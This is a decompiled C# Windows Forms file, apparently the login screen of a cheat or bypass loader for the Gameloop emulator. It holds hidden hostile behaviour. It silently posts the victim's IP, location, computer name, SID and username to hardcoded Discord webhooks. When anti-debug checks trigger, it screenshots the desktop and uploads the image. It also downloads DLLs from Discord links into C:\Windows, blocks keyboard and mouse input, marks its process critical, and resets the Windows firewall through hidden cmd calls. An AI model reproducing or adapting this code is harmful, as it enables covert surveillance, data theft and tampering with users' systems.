using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using DebugProtector;
using Guna.UI2.WinForms;

namespace numer
{
	// Token: 0x02000031 RID: 49
	public partial class Form2 : Form
	{
		// Token: 0x0600015F RID: 351
		[DllImport("Kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool AlloConsol();

		// Token: 0x06000160 RID: 352 RVA: 0x0000DB5C File Offset: 0x0000BD5C
		private static void SendMs(string message, string webhook)
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("Content-Type", "application/json");
			string s = "{\"content\": \"" + message + "\"}";
			webClient.UploadData(webhook, Encoding.UTF8.GetBytes(s));
		}

		// Token: 0x06000161 RID: 353 RVA: 0x00006A60 File Offset: 0x00004C60
		private void sendImg(string url, string filePath)
		{
			HttpClient httpClient = new HttpClient();
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			byte[] array = File.ReadAllBytes(filePath);
			multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), Path.GetExtension(filePath), filePath);
			httpClient.PostAsync(url, multipartFormDataContent).Wait();
			httpClient.Dispose();
		}

		// Token: 0x06000162 RID: 354 RVA: 0x0000DBA8 File Offset: 0x0000BDA8
		private void CaptureMyScreen2()
		{
			try
			{
				Path.GetTempPath();
				string name = WindowsIdentity.GetCurrent().Name;
				Bitmap bitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
				Rectangle bounds = Screen.AllScreens[0].Bounds;
				Graphics.FromImage(bitmap).CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
				bitmap.Save("C:\\Windows\\Setup\\\\crack.jpg", ImageFormat.Jpeg);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000163 RID: 355
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000164 RID: 356
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000165 RID: 357
		[DllImport("user32.dll", CharSet = CharSet.Unicode)]
		private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);

		// Token: 0x06000166 RID: 358
		[DllImport("user32.dll", SetLastError = true)]
		private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x06000167 RID: 359 RVA: 0x0000DC30 File Offset: 0x0000BE30
		public static string GetProcessorId()
		{
			ManagementObjectCollection instances = new ManagementClass("win32_processor").GetInstances();
			string result = string.Empty;
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = instances.GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					result = ((ManagementObject)enumerator.Current).Properties["processorID"].Value.ToString();
				}
			}
			return result;
		}

		// Token: 0x06000168 RID: 360 RVA: 0x0000DCA4 File Offset: 0x0000BEA4
		public static string GetComputerName()
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
			string result = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in instances)
			{
				result = (string)((ManagementObject)managementBaseObject)["Name"];
			}
			return result;
		}

		// Token: 0x06000169 RID: 361 RVA: 0x0000DD10 File Offset: 0x0000BF10
		public Form2()
		{
			this.InitializeComponent();
			this.loginBtn.Visible = false;
			this.checkk.RunWorkerAsync();
			base.FormBorderStyle = FormBorderStyle.None;
			this.BackColor = Color.LimeGreen;
			base.TransparencyKey = Color.LimeGreen;
			this.textBox1.BackColor = this.BackColor;
			base.Region = Region.FromHrgn(Form2.CreateRoundRectRgn(0, 0, base.Width, base.Height, 32, 22));
			this.BW_hotkeys.RunWorkerAsync();
			this.backgroundWorker1.RunWorkerAsync();
		}

		// Token: 0x0600016A RID: 362
		[DllImport("user32.dll")]
		private static extern short GetAsyncKeyState(Keys vKey);

		// Token: 0x0600016B RID: 363 RVA: 0x00002900 File Offset: 0x00000B00
		private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
		{
			e.Handled = (!char.IsDigit(e.KeyChar) && !char.IsControl(e.KeyChar));
		}

		// Token: 0x0600016C RID: 364 RVA: 0x0000DE14 File Offset: 0x0000C014

		// Token: 0x0600016D RID: 365
		[DllImport("Gdi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

		// Token: 0x0600016E RID: 366
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool AllocConsole();

		// Token: 0x0600016F RID: 367 RVA: 0x0000DE54 File Offset: 0x0000C054
		private void Form2_Load(object sender, EventArgs e)
		{
			//Form2.<>c__DisplayClass26_0 CS$<>8__locals1 = new Form2.<>c__DisplayClass26_0();
			//CS$<>8__locals1.random = new Random();
			//CS$<>8__locals1.<Form2_Load>g__RandomString|0(3);
			//this.hdd.Text = Form2.GetProcessorId() + "-" + Form2.GetComputerName();
			//this.random1.Text = CS$<>8__locals1.<Form2_Load>g__RandomString|0(3);
			string path = "C:\\Windows\\ucrtbased.dll";
			string path2 = "C:\\Windows\\VCRUNTIME140_1D.dll";
			string path3 = "C:\\Windows\\VCRUNTIME140D.dll";
			string path4 = "C:\\Windows\\MSVCP140D.dll";
			if (!File.Exists(path))
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadFile("https://cdn.discordapp.com/attachments/1026251677998796901/1047180861780541460/ucrtbased.dll", "C:\\Windows\\ucrtbased.dll");
				}
			}
			if (!File.Exists(path2))
			{
				using (WebClient webClient2 = new WebClient())
				{
					webClient2.DownloadFile("https://cdn.discordapp.com/attachments/1026251677998796901/1047180862124470329/VCRUNTIME140_1D.dll", "C:\\Windows\\VCRUNTIME140_1D.dll");
				}
			}
			if (!File.Exists(path3))
			{
				using (WebClient webClient3 = new WebClient())
				{
					webClient3.DownloadFile("https://cdn.discordapp.com/attachments/1026251677998796901/1047180862606802985/VCRUNTIME140D.dll", "C:\\Windows\\VCRUNTIME140D.dll");
				}
			}
			if (!File.Exists(path4))
			{
				using (WebClient webClient4 = new WebClient())
				{
					webClient4.DownloadFile("https://cdn.discordapp.com/attachments/1026251677998796901/1047180862896226444/MSVCP140D.dll", "C:\\Windows\\MSVCP140D.dll");
				}
			}
		}

		// Token: 0x06000170 RID: 368 RVA: 0x0000DFB0 File Offset: 0x0000C1B0
		private void BW_loginBtn_DoWork(object sender, DoWorkEventArgs e)
		{
					new BP().Show();
					this.Hide();
		}

		// Token: 0x06000171 RID: 369 RVA: 0x00002926 File Offset: 0x00000B26
		private void guna2TextBox1_TextChanged(object sender, EventArgs e)
		{
			if (this.guna2TextBox1.Text == this.random1.Text)
			{
				this.loginBtn.Visible = true;
			}
		}

		// Token: 0x06000172 RID: 370 RVA: 0x0000E038 File Offset: 0x0000C238
		private void guna2TextBox1_KeyPress(object sender, KeyPressEventArgs e)
		{
			if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar) && e.KeyChar != '.')
			{
				e.Handled = true;
			}
			if (e.KeyChar == '.' && (sender as TextBox).Text.IndexOf('.') > -1)
			{
				e.Handled = true;
			}
		}

		// Token: 0x06000173 RID: 371 RVA: 0x000025FF File Offset: 0x000007FF
		private void guna2TextBox2_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000174 RID: 372 RVA: 0x0000E098 File Offset: 0x0000C298
		private void timer1_Tick(object sender, EventArgs e)
		{
			Random random = new Random();
			int red = random.Next(0, 255);
			int green = random.Next(0, 255);
			int blue = random.Next(255, 255);
			this.status.BorderColor = Color.FromArgb(red, green, blue);
			this.label2.ForeColor = Color.FromArgb(red, green, blue);
			this.status.ForeColor = Color.FromArgb(red, green, blue);
		}

		// Token: 0x06000175 RID: 373 RVA: 0x000025FF File Offset: 0x000007FF
		private void animatedText_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x06000176 RID: 374 RVA: 0x0000E110 File Offset: 0x0000C310
		private void loginBtn_Click_1(object sender, EventArgs e)
		{
			if (!this.BW_loginBtn.IsBusy)
			{
				this.loginBtn.Cursor = Cursors.No;
				this.loginBtn.ForeColor = Color.Orange;
				this.status.Text = "";
				this.BW_loginBtn.RunWorkerAsync();
			}
		}

		// Token: 0x06000177 RID: 375 RVA: 0x00002951 File Offset: 0x00000B51
		private void Form2_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Form2.ReleaseCapture();
				Form2.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000178 RID: 376
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

		// Token: 0x06000179 RID: 377 RVA: 0x0000E168 File Offset: 0x0000C368
		private static void killChildren(int parentPID)
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("Select * From Win32_Process Where ParentProcessID=" + parentPID.ToString()).Get())
			{
				Form2.killChildren(Convert.ToInt32(((ManagementObject)managementBaseObject)["ProcessID"]));
			}
			try
			{
				Process.GetProcessById(parentPID).Kill();
			}
			catch (ArgumentException)
			{
			}
		}

		// Token: 0x0600017A RID: 378 RVA: 0x0000776C File Offset: 0x0000596C
		public string IPRequestHelper(string url)
		{
			StreamReader streamReader = new StreamReader(((HttpWebResponse)((HttpWebRequest)WebRequest.Create(url)).GetResponse()).GetResponseStream());
			string result = streamReader.ReadToEnd();
			streamReader.Close();
			streamReader.Dispose();
			return result;
		}

		// Token: 0x0600017B RID: 379 RVA: 0x0000E1FC File Offset: 0x0000C3FC
		public string GetCountryByIP(string ipAddress)
		{
			string xml = this.IPRequestHelper("http://ip-api.com/xml/" + ipAddress);
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(xml);
			XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("query");
			new NameValueCollection().Add(elementsByTagName.Item(0).ChildNodes[2].InnerText, elementsByTagName.Item(0).ChildNodes[2].Value);
			return elementsByTagName.Item(0).ChildNodes[1].InnerText.ToString();
		}

		// Token: 0x0600017C RID: 380 RVA: 0x0000E288 File Offset: 0x0000C488
		private void timer2_Tick(object sender, EventArgs e)
		{
			try
			{
				this.prr.RunWorkerAsync();
			}
			catch
			{
			}
		}

		// Token: 0x0600017D RID: 381 RVA: 0x0000E2B8 File Offset: 0x0000C4B8
		private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				string text = new WebClient().DownloadString("https://icanhazip.com/");
				string machineName = Environment.MachineName;
				string userName = Environment.UserName;
				string value = WindowsIdentity.GetCurrent().User.Value;
				DateTime now = DateTime.Now;
				string value2 = string.Concat(new string[]
				{
					"@everyone\n ☠ **Contry** : ",
					this.GetCountryByIP(text),
					"\n ☠ **IP** : ",
					text.Trim(),
					"\n \ud83d\udcbb **Pc Name** : ",
					machineName,
					"\n \ud83d\udcf3 **HWID : **",
					value,
					"\n ** \ud83d\udda5 User_Name : **",
					userName,
					"\n \ud83d\udd11 **Key** : ",
				
					"\n \ud83d\uded2 **Bypass** : \n ⏱ Data : ",
					now.ToString()
				});
				HttpClient httpClient = new HttpClient();
				FormUrlEncodedContent content = new FormUrlEncodedContent(new Dictionary<string, string>
				{
					{
						"content",
						value2
					}
				});
				Uri requestUri = new Uri("https://canary.discord.com/api/webhooks/1088539664379551835/myF9w-yROYhJwCv27nszZoR67uYoo3nd2zWTfCx1uomFdo4aN3kMkCPgcd1BuM885-9M");
				httpClient.PostAsync(requestUri, content);
			}
			catch
			{
			}
		}

		// Token: 0x0600017E RID: 382 RVA: 0x000063F8 File Offset: 0x000045F8
		public void dos(string command)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = " /C " + command,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = false,
				CreateNoWindow = true,
				RedirectStandardError = false,
				RedirectStandardOutput = false
			};
			process.Start();
			process.WaitForExit(5000);
		}

		// Token: 0x0600017F RID: 383 RVA: 0x00002979 File Offset: 0x00000B79
		private void timer3_Tick(object sender, EventArgs e)
		{
			this.text.RunWorkerAsync();
		}

		// Token: 0x06000180 RID: 384 RVA: 0x000025FF File Offset: 0x000007FF
		private void checkk_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x06000181 RID: 385 RVA: 0x00002986 File Offset: 0x00000B86
		private void guna2HtmlLabel1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x06000182 RID: 386 RVA: 0x00002986 File Offset: 0x00000B86
		private void label2_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x06000183 RID: 387 RVA: 0x000025FF File Offset: 0x000007FF
		private void checkk_DoWork_1(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x06000184 RID: 388 RVA: 0x0000298E File Offset: 0x00000B8E
		private void check_Tick(object sender, EventArgs e)
		{
			if (this.malak == 1)
			{
				Form2.NativeMethods.BlockInput(true);
				return;
			}
			if (this.malak == 0)
			{
				Form2.NativeMethods.BlockInput(false);
			}
		}

		// Token: 0x06000185 RID: 389 RVA: 0x0000E3CC File Offset: 0x0000C5CC
		private void prr_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				string text = DebuggerAcl.Run();
				if (text != "")
				{
					this.CaptureMyScreen2();
					string filePath = "C:\\Windows\\Setup\\crack.jpg";
					this.sendImg("https://discord.com/api/webhooks/1130290957334626314/y7IyUEWU7iWKV-QO5RqJ07OPPm311zXpd1wMwp85sHxhTMCCHmsJdljoOoJUJvlgWqH3", filePath);
					string text2 = new WebClient().DownloadString("https://icanhazip.com/");
					string machineName = Environment.MachineName;
					string value = WindowsIdentity.GetCurrent().User.Value;
					string userName = Environment.UserName;
					string value2 = string.Concat(new string[]
					{
						"\ud83d\ude02 **Program Check**  : ",
						text,
						"\n ☠ **Contry** : ",
						this.GetCountryByIP(text2),
						"\n ☠ **IP** : ",
						text2.Trim(),
						"\n \ud83d\udcbb **Pc Name** : ",
						machineName,
						"\n \ud83d\udcf3 **HWID : **",
						value,
						"\n ** \ud83d\udda5 User_Name : **",
						userName,
						"\n \ud83d\udd11 **Key** : ",

						"\n \ud83d\uded2 **Bypass** : ",

					});
					HttpClient httpClient = new HttpClient();
					FormUrlEncodedContent content = new FormUrlEncodedContent(new Dictionary<string, string>
					{
						{
							"content",
							value2
						}
					});
					Uri requestUri = new Uri("https://discord.com/api/webhooks/1130290957334626314/y7IyUEWU7iWKV-QO5RqJ07OPPm311zXpd1wMwp85sHxhTMCCHmsJdljoOoJUJvlgWqH3");
					httpClient.PostAsync(requestUri, content);
	
					Process.EnterDebugMode();
					Form2.RtlSetProcessIsCritical(1U, 0U, 0U);
					Process.GetCurrentProcess().Kill();
					this.dos("taskkill /F /IM AndroidProcess.exe");
					this.dos("taskkill /F /IM ProjectTitan.exe");
					this.dos("taskkill /F /im AndroidEmulator.exe");
					this.dos("taskkill /F /im AndroidEmulatorEn.exe");
					this.dos("taskkill /F /im AndroidEmulatorEx.exe");
					this.dos("taskkill /F /im Gameloop.exe");
					Thread.Sleep(1000);
					Environment.Exit(0);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000186 RID: 390 RVA: 0x000029B0 File Offset: 0x00000BB0
		private void text_DoWork(object sender, DoWorkEventArgs e)
		{
			base.Invoke(new Action(delegate()
			{
				try
				{
					string text = DebuggerAcl2.mazn();
					if (text != "")
					{
						this.malak = 1;
						this.CaptureMyScreen2();
						string filePath = "C:\\Windows\\Setup\\crack.jpg";
						this.sendImg("https://discord.com/api/webhooks/1130290957334626314/y7IyUEWU7iWKV-QO5RqJ07OPPm311zXpd1wMwp85sHxhTMCCHmsJdljoOoJUJvlgWqH3", filePath);
						WebClient webClient = new WebClient();
						string text2 = webClient.DownloadString("http://ip-api.com/csv/?fields=query");
						string text3 = webClient.DownloadString("http://ip-api.com/csv/?fields=country");
						string text4 = webClient.DownloadString("http://ip-api.com/csv/?fields=city");
						string machineName = Environment.MachineName;
						string userName = Environment.UserName;
						string value = WindowsIdentity.GetCurrent().User.Value;
						string value2 = string.Concat(new string[]
						{
							"\ud83d\ude02 **Text Copy**  : ",
							text,
							"\n ☠ **Contry** : ",
							text3.Trim(),
							"\n ☠ **IP** : ",
							text2.Trim(),
							"\n \ud83d\udea9 **City** : ",
							text4.Trim(),
							"\n \ud83d\udcbb **Pc Name** : ",
							machineName,
							"\n \ud83d\udcf3 **HWID : **",
							value,
							"\n ** \ud83d\udda5 User_Name : **",
							userName
						});
						HttpClient httpClient = new HttpClient();
						FormUrlEncodedContent content = new FormUrlEncodedContent(new Dictionary<string, string>
						{
							{
								"content",
								value2
							}
						});
						Uri requestUri = new Uri("https://discord.com/api/webhooks/1130290957334626314/y7IyUEWU7iWKV-QO5RqJ07OPPm311zXpd1wMwp85sHxhTMCCHmsJdljoOoJUJvlgWqH3");
						httpClient.PostAsync(requestUri, content);

						Process.EnterDebugMode();
						Form2.RtlSetProcessIsCritical(1U, 0U, 0U);
						Process.GetCurrentProcess().Kill();
						this.dos("taskkill /F /IM AndroidProcess.exe");
						this.dos("taskkill /F /IM ProjectTitan.exe");
						this.dos("taskkill /F /im AndroidEmulator.exe");
						this.dos("taskkill /F /im AndroidEmulatorEn.exe");
						this.dos("taskkill /F /im AndroidEmulatorEx.exe");
						this.dos("taskkill /F /im Gameloop.exe");
						Thread.Sleep(1800);
						this.malak = 0;
						Environment.Exit(0);
					}
				}
				catch
				{
				}
			}));
		}

		// Token: 0x06000187 RID: 391 RVA: 0x0000E5B0 File Offset: 0x0000C7B0
		private void Form2_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.dos("netsh advfirewall reset");
				this.dos("taskkill /F /IM AndroidProcess.exe");
				this.dos("taskkill /F /IM ProjectTitan.exe");
				this.dos("taskkill /F /im AndroidEmulator.exe");
				this.dos("taskkill /F /im AndroidEmulatorEn.exe");
				this.dos("taskkill /F /im AndroidEmulatorEx.exe");
				this.dos("taskkill /F /im Gameloop.exe");
				Environment.Exit(0);
			}
			catch
			{
			}
		}

		// Token: 0x06000188 RID: 392 RVA: 0x0000E5B0 File Offset: 0x0000C7B0
		private void Form2_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				this.dos("netsh advfirewall reset");
				this.dos("taskkill /F /IM AndroidProcess.exe");
				this.dos("taskkill /F /IM ProjectTitan.exe");
				this.dos("taskkill /F /im AndroidEmulator.exe");
				this.dos("taskkill /F /im AndroidEmulatorEn.exe");
				this.dos("taskkill /F /im AndroidEmulatorEx.exe");
				this.dos("taskkill /F /im Gameloop.exe");
				Environment.Exit(0);
			}
			catch
			{
			}
		}

		// Token: 0x04000384 RID: 900
		public static Form2 login;

		// Token: 0x04000385 RID: 901
		public string username;

		// Token: 0x04000386 RID: 902
		public string expiry;

		// Token: 0x04000387 RID: 903
		public const int WM_NCLBUTTONDOWN = 161;

		// Token: 0x04000388 RID: 904
		public const int HT_CAPTION = 2;

		// Token: 0x04000389 RID: 905
		public int malak;

		// Token: 0x0400038A RID: 906
		public int animatedTextLength;

		// Token: 0x0400038B RID: 907
		public string animatedTextValue;

		// Token: 0x0400038C RID: 908
		public string animatedTextColor = "White";

		// Token: 0x02000032 RID: 50
		public class NativeMethods
		{
			// Token: 0x0600018C RID: 396
			[DllImport("user32.dll")]
			[return: MarshalAs(UnmanagedType.Bool)]
			internal static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
		}
	}
}
